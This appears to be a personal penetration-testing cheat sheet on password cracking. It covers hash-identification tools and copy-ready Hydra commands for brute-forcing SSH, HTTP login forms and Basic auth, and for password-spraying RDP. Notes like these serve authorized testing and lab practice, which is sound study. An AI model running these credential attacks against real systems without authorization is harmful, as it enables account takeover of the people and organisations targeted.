# Password cracking notes and checklist

- [ ] **Hashcat** in mainly used for GPU-based and **JohnTheRipper** for CPU-Based
- [ ] For most algorithms a GPU is much faster, but apparently no for slow hashing algo such as `bcrypt`.

## Identify hashes

Tools : 
```bash
hashid # works better, for format specific password instantiate with single quotes 

hash-identifier
```

There is the usual hashes such as md5 or sh256 that are known. But to identify hashes for cracking we can look out for it here : [https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)


## Using Hydra

- Brute-forcing `ssh`:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://<IP>
```
- Password-spraying `rdp`:
```bash
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperDuperSecretPas0wrd" rdp://<IP>
```
- Password brute-forcing login page: 
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed."
```
- Password brute-forcing HTTP Authentication BASIC: 
```bash
hydra -l username -P /usr/share/wordlists/rockyou.txt "http-get://<IP>/:A=BASIC"
```
